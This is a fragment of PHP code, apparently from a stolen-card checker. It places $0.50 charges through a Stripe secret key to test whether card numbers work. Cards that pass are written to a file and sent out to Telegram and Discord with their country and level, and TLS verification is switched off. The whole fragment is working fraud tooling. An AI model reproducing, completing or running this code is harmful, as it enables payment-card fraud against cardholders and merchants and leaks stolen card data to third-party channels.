...
if(!$token){
  if(isset($dcode_src)){
    if(strpos($code_src, "incorrect_cvc")){
      ...
      echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">'.$code_src.' ~ '.$dcode_src.'</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
      exit;  
    }
  } else {
...
$headers = array();
$headers[] = 'Authorization: Bearer '.$sklive.'';
$postfield = 'amount=50&currency=usd&customer=cus_'.$cus.'';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl3 = curl_exec($ch);
...
if (substr_count($curl3, '"status": "succeeded"') > 0){ 
  fwrite(fopen("individua5.txt", "a"), $card ."\r\n");
  $msg_1 = urlencode("<code>$card</code> ~ CVV Matched ($0.5) ~ <b>Country:</b> $country ~ <b>Level</b>: $level");
  sendLive($chatId, $msg_1);  
  sendLiveToDiscord("`$card ` ~ CVV Matched ($0.5) ~ **Country:** $country");
